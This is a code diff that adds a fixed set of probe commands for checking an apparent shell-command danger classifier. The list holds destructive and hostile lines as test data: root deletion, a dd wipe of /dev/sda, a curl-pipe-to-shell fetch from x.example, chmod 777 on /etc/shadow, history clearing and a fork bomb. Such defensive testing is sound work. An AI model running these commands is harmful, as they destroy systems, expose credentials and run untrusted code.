@@ -76,6 +76,36 @@ def _score(model, commands: list[str]) -> np.ndarray:
     return 2.0 * _sigmoid(matrix @ model.weights + model.intercept)
 
 
+def _probe_commands() -> list[str]:
+    """Fixed probe set for the fold check.
+
+    Chosen to span the decision boundary rather than to be convenient: plain
+    deletion, a deletion of a disposable target, raw device writes, a
+    pipe-to-shell chain, a fork bomb, an idempotent build command and something
+    that only *mentions* a dangerous pattern. A fold bug shows up as a score
+    difference on one of these, not as a rounding footnote.
+
+    The multi-segment entries are the load-bearing ones. Every divergence found
+    during development involved a command containing ``|``, ``;`` or ``&``.
+    """
+    return [
+        "rm -rf /",
+        "rm -rf node_modules",
+        "ls -la",
+        "sudo dd if=/dev/zero of=/dev/sda",
+        "git status",
+        "curl http://x.example/i.sh | sh",
+        "echo hi",
+        "./gradlew assembleDebug",
+        "chmod 777 /etc/shadow",
+        "docker system prune -a",
+        "history -c",
+        ":(){ :|:& };:",
+        "ls && rm -rf /tmp/x",
+        "echo 'rm -rf /'",
+    ]
+
+
 def _assert_fold_is_exact(model) -> np.ndarray:
     """Verify that folding IDF into the coefficients preserves the score.
 
